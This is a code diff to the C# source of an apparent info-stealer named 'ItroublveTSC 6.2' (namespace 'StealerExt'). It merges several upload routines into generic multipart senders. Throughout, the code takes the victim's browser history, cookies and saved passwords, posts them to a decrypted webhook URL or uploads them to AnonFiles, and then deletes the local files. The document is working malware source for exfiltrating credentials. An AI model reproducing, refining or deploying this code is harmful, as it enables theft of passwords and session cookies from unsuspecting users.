@@ -19,7 +19,7 @@ namespace StealerExt
 			if (string.IsNullOrEmpty(File.ReadAllText(_history)))
 			{
 
-				new API(wHook).SendHistory("History file is empty.");
+				new API(wHook).SendMultiPartData("History file is empty.");
 				return;
 			}
 			long s = new FileInfo(_history).Length;
@@ -28,18 +28,18 @@ namespace StealerExt
 				bool flag = File.Exists(_history);
 				if (flag )
 				{
-					new API(wHook).SendHistory("**Browser History**", _history);
+					new API(wHook).SendMultiPartData("**Browser History**", $"{Environment.UserName}_History.txt", _history);
 				}
 				else
 				{
-					new API(wHook).SendHistory("No history found");
+					new API(wHook).SendMultiPartData("No history found");
 				}
 			}
 			else
 			{
 				string info = null;
 				UploadAnonFiles.UploadFile(_history, ref info);
-				new API(wHook).SendPasswords(info.Replace("{0}", nameof(History)));
+				new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(History)));
 			}
 			File.Delete(_history);
         }
@@ -59,7 +59,7 @@ namespace StealerExt
 			long size_c = new FileInfo(text).Length;
 			if (string.IsNullOrEmpty(File.ReadAllText(text))) 
 			{
-				new API(wHook).SendCookies("Cookies file is empty.");
+				new API(wHook).SendMultiPartData("Cookies file is empty.");
 				return;
 			}
 			if (size_c < 7950000)
@@ -67,18 +67,18 @@ namespace StealerExt
 				bool flag = File.Exists(text);
 				if (flag)
 				{
-					new API(wHook).SendCookies("**Browser Cookies**", text);
+					new API(wHook).SendMultiPartData("**Browser Cookies**", $"{Environment.UserName}_Cookies.txt", text);
 				}
 				else
 				{
-					new API(wHook).SendCookies("No cookies found!");
+					new API(wHook).SendMultiPartData("No cookies found!");
 				}
 			}
             else
             {
 				string info = null;
 				UploadAnonFiles.UploadFile(text, ref info);
-                new API(wHook).SendCookies(info.Replace("{0}", nameof(Cookies)));
+                new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(Cookies)));
 			}
 			File.Delete(text);
 		}
@@ -89,7 +89,7 @@ namespace StealerExt
 			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
 			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
 			{
-				new API(wHook).SendPasswords("Password file is empty.");
+				new API(wHook).SendMultiPartData("Password file is empty.");
 				return;
 			}
 			long size_psw = new FileInfo(passwordLoc).Length;
@@ -97,118 +97,50 @@ namespace StealerExt
             {
 				if (File.Exists(passwordLoc))
 				{
-					new API(wHook).SendPasswords("**Browser Password**", passwordLoc);
+					new API(wHook).SendMultiPartData($"{Environment.UserName}_Passwords.txt" ,"**Browser Password**", passwordLoc);
 				}
 				else
 				{
-					new API(wHook).SendPasswords("No browser passwords found!");
+					new API(wHook).SendMultiPartData("No browser passwords found!");
 				}
 			}
             else
             {
 				string info = null;
 				UploadAnonFiles.UploadFile(passwordLoc, ref info);
-				new API(wHook).SendPasswords(info.Replace("{0}", nameof(Passwords)));
+				new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(Passwords)));
 			}
 			File.Delete(passwordLoc);
 		}
 
-		// Junk... Can't bother updating tho and who cares :c
-		public bool SendCookies(string content = null, string file = null)
+		public bool SendMultiPartData(string Content = null, string FileName = null, string filePath = null)
 		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
+			if (string.IsNullOrEmpty(Content) && (new FileInfo(filePath).Length > 0)) return false;
+			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
 			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Cookies.txt", Environment.UserName + "_Cookies.txt");
-			}
+				{ new StringContent(name), "username" },
+				{ new StringContent(pfp), "avatar_url" },
+				{ new StringContent(Content), "content" }
+			};
+			if (filePath != null) multipartFormDataContent.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "File", FileName);
+			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
+			return result.StatusCode == HttpStatusCode.NoContent;
+		}
+		public bool SendMultiPartStream(string Content = null, string FileName = null, MemoryStream memoryStream = null)
+		{
+			if (string.IsNullOrEmpty(Content) && (memoryStream != null)) return false;
+			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
+			{
+				{ new StringContent(name), "username" },
+				{ new StringContent(pfp), "avatar_url" },
+				{ new StringContent(Content), "content" }
+			};
+            if (memoryStream != null) multipartFormDataContent.Add(new ByteArrayContent(memoryStream.ToArray()), "File", FileName);
 			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
 			return result.StatusCode == HttpStatusCode.NoContent;
 		}
 
-		public bool SendHistory(string content = null, string file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
-			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_History.txt", Environment.UserName + "_History.txt");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-
-		public bool SendScreenshot(MemoryStream file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(null), "content");
-			bool flag = file.Length > 0;
-			if (flag)
-			{
-				multipartFormDataContent.Add(new ByteArrayContent(file.ToArray()), "screenshot", "Screenshot.png");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-
-		public bool SendPasswords(string content, string file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
-			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Passwords.txt", Environment.UserName + "_Passwords.txt");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-
-		public bool SendWCC(string content = null, string file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
-			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-		public bool idk(string content, string file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
-			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-        
-        public static string wHook => Hook._DecryptedHook;
+		public static string wHook => Hook._DecryptedHook;
 		public const string name = "ItroublveTSC 6.2";
 		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
 		private HttpClient _Client;
